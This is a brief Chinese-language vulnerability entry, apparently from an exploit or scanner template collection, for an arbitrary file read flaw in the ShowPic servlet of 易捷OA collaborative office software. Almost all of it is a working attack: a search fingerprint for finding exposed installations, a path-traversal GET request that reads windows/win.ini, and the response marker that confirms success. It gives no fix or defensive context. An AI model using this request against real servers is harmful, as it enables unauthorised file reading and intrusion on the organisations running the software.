# 易捷OA协同办公软件ShowPic任意文件读取漏洞

易捷OA协同办公软件ShowPic ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/images/logon/bg_img.jpg"`
- **请求**：`GET /servlet/ShowPic?filePath=../../windows/win.ini HTTP/1.1`
- **响应特征**：200 [Mail]